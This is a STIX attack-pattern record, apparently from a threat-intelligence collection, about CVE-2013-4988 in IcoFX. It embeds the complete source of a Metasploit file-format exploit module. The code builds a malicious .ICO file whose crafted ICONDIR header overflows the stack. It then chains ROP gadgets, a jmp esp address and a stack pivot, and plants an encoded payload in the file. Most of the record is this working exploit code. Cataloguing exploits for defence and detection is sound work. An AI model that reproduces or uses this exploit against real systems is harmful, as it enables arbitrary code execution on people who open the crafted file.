{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e65f319f-4b76-4cbd-8479-954a50a279fa",
    "created": "2024-08-14T16:38:12.106319Z",
    "modified": "2024-08-14T16:38:12.106323Z",
    "name": "IcoFX Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in version 2.1 of IcoFX. The vulnerability exists while parsing .ICO files, where a specially crafted ICONDIR header providing an arbitrary long number of images in the file can be used to trigger the overflow when reading the ICONDIRENTRY structures.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/icofx_bof.rb",
            "external_id": "icofx_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4988"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/advisories/icofx-buffer-overflow-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IcoFX Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow vulnerability in version 2.1\n        of IcoFX. The vulnerability exists while parsing .ICO files, where a specially\n        crafted ICONDIR header providing an arbitrary long number of images in the file\n        can be used to trigger the overflow when reading the ICONDIRENTRY structures.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Marcos Accossatto', # Vulnerability discovery, poc\n          'juan vazquez' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-4988' ],\n          [ 'OSVDB', '100826' ],\n          [ 'BID', '64221' ],\n          [ 'EDB', '30208'],\n          [ 'URL', 'http://www.coresecurity.com/advisories/icofx-buffer-overflow-vulnerability' ]\n        ],\n      'Platform'          => [ 'win' ],\n      'Payload'           =>\n        {\n          'DisableNops'    => true,\n          'Space'          => 864,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Targets'        =>\n        [\n          [ 'IcoFX 2.5 / Windows 7 SP1',\n            {\n              :callback => :target_win7,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2013-12-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.ico'])\n      ])\n\n  end\n\n  def target_win7\n    # All the gadgets com from IcoFX2.exe 2.5.0.0\n\n    # ICONDIR structure\n    ico =  [0].pack(\"v\") # Reserved. Must always be 0\n    ico << [1].pack(\"v\") # Image type: 1 for icon (.ico) image\n    # 0x66 is enough to overwrite the local variables and, finally\n    # the seh handler. 0x7f00 is used to trigger an exception after\n    # the overflow, while the overwritten SEH handler is in use.\n    ico << [0x7f00].pack(\"v\")\n    # ICONDIRENTRY structures 102 structures are using to overwrite\n    # every structure = 16 bytes\n    # 100 structures are used to reach the local variables\n    ico << rand_text(652)\n    ico << [0x0044729d].pack(\"V\") * 20 # ret # rop nops are used to allow code execution with the different opening methods\n    ico << [0x0045cc21].pack(\"V\")      # jmp esp\n    ico << payload.encoded\n    ico << rand_text(\n      1600 -                 # 1600 = 16 ICONDIRENTRY struct size * 100\n      652 -                  # padding to align the stack pivot\n      80 -                   # rop nops size\n      4 -                    # jmp esp pointer size\n      payload.encoded.length\n    )\n    # The next ICONDIRENTRY allows to overwrite the interesting local variables\n    # on the stack\n    ico << [2].pack(\"V\")          # Counter (remaining bytes) saved on the stack\n    ico << rand_text(8)           # Padding\n    ico << [0xfffffffe].pack(\"V\") # Index to the dst buffer saved on the stack, allows to point to the SEH handler\n    # The next ICONDIRENTRY allows to overwrite the seh handler\n    ico << [0x00447296].pack(\"V\") # Stackpivot: add esp, 0x800 # pop ebx # ret\n    ico << rand_text(0xc) # padding\n    return ico\n  end\n\n  def exploit\n    unless self.respond_to?(target[:callback])\n      fail_with(Failure::BadConfig, \"Invalid target specified: no callback function defined\")\n    end\n\n    ico = self.send(target[:callback])\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(ico)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-10",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}